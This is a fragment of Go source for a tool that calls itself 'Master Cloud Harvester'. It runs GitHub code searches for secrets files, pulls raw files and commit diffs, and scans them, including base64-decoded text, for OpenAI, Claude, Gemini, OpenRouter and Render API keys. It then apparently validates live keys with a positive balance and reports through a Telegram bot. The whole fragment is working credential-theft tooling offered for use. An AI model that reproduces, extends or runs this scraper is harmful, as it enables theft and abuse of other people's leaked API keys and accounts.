	telegramBot.SendMessage(`🚀 <b>Master Cloud Harvester Online (Golang Engine)</b>
━━━━━━━━━━━━━━━━━━
Specs: 1 CPU, 2GB RAM Mode
Volatile Memory: <b>Active (Zero Keys Stored on Disk)</b>
Target Verification:
- OpenAI (gpt-6.1-terra / gpt-6.2-astra)
- Claude (claude-sonnet-5-5)
- Gemini (gemini-4-argon / gemma-4-31b-it)
- OpenRouter (Positive Balance Filter)
- Render (Live Accounts + Auto-Dump Upload)

<i>Awaiting GitHub tokens... Send them here to activate crawlers!</i>`)

	fmt.Println("=================================================================")
	fmt.Println("🚀 MASTER CLOUD HARVESTER ONLINE (GOLANG ULTRA-LOW RAM ENGINE) 🚀")
	fmt.Println("=================================================================")
	fmt.Println("[*] Volatile RAM Mode Active: Zero hardcoded tokens on disk.")
	fmt.Println("[*] Waiting for tokens via Telegram or /add command to start scraping...")

	fileQueue := make(chan FileTask, MaxQueueSize)
	repoQueue := make(chan string, 500)

	// Workers
	for i := 1; i <= WorkerCount; i++ {
		go func(id int) {
			client := &http.Client{Timeout: 20 * time.Second}
			for {
				select {
				case <-ctx.Done():
					return
				case task := <-fileQueue:
					if GlobalPaused.Load() {
						time.Sleep(1 * time.Second)
						continue
					}
					if dedup.HasURL(task.URL) {
						continue
					}

					token := tokenPool.GetRandomToken()
					req, err := http.NewRequest("GET", task.URL, nil)
					if err == nil {
						if token != "" {
							req.Header.Set("Authorization", "token "+token)
						}
						req.Header.Set("User-Agent", "Mozilla/5.0")
						resp, err := client.Do(req)
						if err == nil && resp != nil {
							if resp.StatusCode == 401 && token != "" {
								tokenPool.MarkDead(token)
							} else if resp.StatusCode == 200 {
								content, _ := io.ReadAll(resp.Body)
								resp.Body.Close()
								strContent := string(content)

								// Deep secret extraction
								for _, k := range OpenAIKeyRegex.FindAllString(strContent, -1) {
									go auditor.AuditOpenAI(k, task.RepoName+"/"+task.FilePath)
								}
								for _, k := range ClaudeKeyRegex.FindAllString(strContent, -1) {
									go auditor.AuditClaude(k, task.RepoName+"/"+task.FilePath)
								}
								for _, k := range GeminiKeyRegex.FindAllString(strContent, -1) {
									go auditor.AuditGemini(k, task.RepoName+"/"+task.FilePath)
								}
								for _, k := range OpenRouterKeyRegex.FindAllString(strContent, -1) {
									go auditor.AuditOpenRouter(k, task.RepoName+"/"+task.FilePath)
								}
								for _, k := range RenderKeyRegex.FindAllString(strContent, -1) {
									go auditor.AuditRender(k, task.RepoName+"/"+task.FilePath)
								}

								// Base64 decode scan
								for _, b64 := range Base64Candidate.FindAllString(strContent, -1) {
									if dec, err := base64.StdEncoding.DecodeString(b64); err == nil {
										decStr := string(dec)
										for _, k := range OpenAIKeyRegex.FindAllString(decStr, -1) {
											go auditor.AuditOpenAI(k, task.RepoName+"/"+task.FilePath+" (Base64)")
										}
										for _, k := range OpenRouterKeyRegex.FindAllString(decStr, -1) {
											go auditor.AuditOpenRouter(k, task.RepoName+"/"+task.FilePath+" (Base64)")
										}
									}
								}

								atomic.AddUint64(&GlobalStats.FilesScanned, 1)
							}
						}
					}
					dedup.AddURL(task.URL)
				}
			}
		}(i)
	}

	// Commit Diff Vacuum Worker
	go func() {
		client := &http.Client{Timeout: 20 * time.Second}
		for {
			select {
			case <-ctx.Done():
				return
			case repo := <-repoQueue:
				if GlobalPaused.Load() || dedup.HasRepo(repo) {
					continue
				}

				token := tokenPool.GetRandomToken()
				url := fmt.Sprintf("https://api.github.com/repos/%s/commits?per_page=6", repo)
				req, _ := http.NewRequest("GET", url, nil)
				if token != "" {
					req.Header.Set("Authorization", "token "+token)
				}
				resp, err := client.Do(req)
				if err == nil && resp != nil && resp.StatusCode == 200 {
					var commits []struct {
						SHA string `json:"sha"`
					}
					body, _ := io.ReadAll(resp.Body)
					resp.Body.Close()
					if json.Unmarshal(body, &commits) == nil {
						for _, c := range commits {
							if dedup.HasCommit(c.SHA) {
								continue
							}
							cURL := fmt.Sprintf("https://api.github.com/repos/%s/commits/%s", repo, c.SHA)
							cReq, _ := http.NewRequest("GET", cURL, nil)
							if token != "" {
								cReq.Header.Set("Authorization", "token "+token)
							}
							cResp, cErr := client.Do(cReq)
							if cErr == nil && cResp != nil && cResp.StatusCode == 200 {
								var cData struct {
									Files []struct {
										Patch string `json:"patch"`
									} `json:"files"`
								}
								cBody, _ := io.ReadAll(cResp.Body)
								cResp.Body.Close()
								if json.Unmarshal(cBody, &cData) == nil {
									for _, f := range cData.Files {
										for _, k := range OpenAIKeyRegex.FindAllString(f.Patch, -1) {
											go auditor.AuditOpenAI(k, repo+" (Commit: "+c.SHA[:7]+")")
										}
										for _, k := range OpenRouterKeyRegex.FindAllString(f.Patch, -1) {
											go auditor.AuditOpenRouter(k, repo+" (Commit: "+c.SHA[:7]+")")
										}
										for _, k := range RenderKeyRegex.FindAllString(f.Patch, -1) {
											go auditor.AuditRender(k, repo+" (Commit: "+c.SHA[:7]+")")
										}
									}
								}
								atomic.AddUint64(&GlobalStats.CommitsDiffed, 1)
							}
							dedup.AddCommit(c.SHA)
						}
					}
				}
				dedup.AddRepo(repo)
				time.Sleep(1 * time.Second)
			}
		}
	}()

	// Code Search Producer with Smart Pacing
	go func() {
		client := &http.Client{Timeout: 15 * time.Second}
		dorks := []string{
			`filename:secrets.toml OPENAI_API_KEY NOT example NOT template`,
			`filename:values.yaml "OPENAI_API_KEY" NOT mock NOT example`,
			`filename:wrangler.toml "OPENAI_API_KEY" NOT example`,
			`filename:docker-compose.override.yml "sk-proj-"`,
			`filename:secrets.toml "sk-or-v1-"`,
			`filename:.env "sk-or-v1-" NOT example`,
			`"api.render.com" rnd_ filename:.env`,
			`filename:secrets.json rnd_ NOT mock`,
			`RENDER_API_KEY rnd_ filename:secrets.toml`,
		}

		for {
			if GlobalPaused.Load() || tokenPool.ActiveCount() == 0 {
				time.Sleep(3 * time.Second)
				continue
			}

			for _, dork := range dorks {
				if GlobalPaused.Load() || tokenPool.ActiveCount() == 0 {
					break
				}

				token := tokenPool.GetRandomToken()
				url := fmt.Sprintf("https://api.github.com/search/code?q=%s&per_page=100&sort=indexed", url.QueryEscape(dork))
				req, _ := http.NewRequest("GET", url, nil)
				if token != "" {
					req.Header.Set("Authorization", "token "+token)
				}
				resp, err := client.Do(req)
				if err == nil && resp != nil {
					if resp.StatusCode == 401 && token != "" {
						tokenPool.MarkDead(token)
					} else if resp.StatusCode == 200 {
						var res struct {
							Items []struct {
								Path       string `json:"path"`
								Repository struct {
									FullName string `json:"full_name"`
								} `json:"repository"`
							} `json:"items"`
						}
						body, _ := io.ReadAll(resp.Body)
						resp.Body.Close()
						if json.Unmarshal(body, &res) == nil {
							for _, it := range res.Items {
								rName := it.Repository.FullName
								if rName != "" && !dedup.HasRepo(rName) {
									select {
									case repoQueue <- rName:
									default:
									}
									mURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/%s", rName, it.Path)
									select {
									case fileQueue <- FileTask{URL: mURL, RepoName: rName, FilePath: it.Path}:
									default:
									}
								}
							}
						}
					}
				}
				// Smart pacing
				time.Sleep(5 * time.Second)
			}

			// End of cycle smart pause
			time.Sleep(20 * time.Second)
		}
	}()

	// Heartbeat Console Logger
	go func() {
		for {
			time.Sleep(15 * time.Second)
			fmt.Printf("[📊 Golang Heartbeat] Files: %d | Commits: %d | Tokens in RAM: %d | Queue: %d | State: %s\n",
				atomic.LoadUint64(&GlobalStats.FilesScanned),
				atomic.LoadUint64(&GlobalStats.CommitsDiffed),
				tokenPool.ActiveCount(),
				len(fileQueue),
				getScanningState(),
			)
		}
	}()

	// Keep alive
	select {}
}
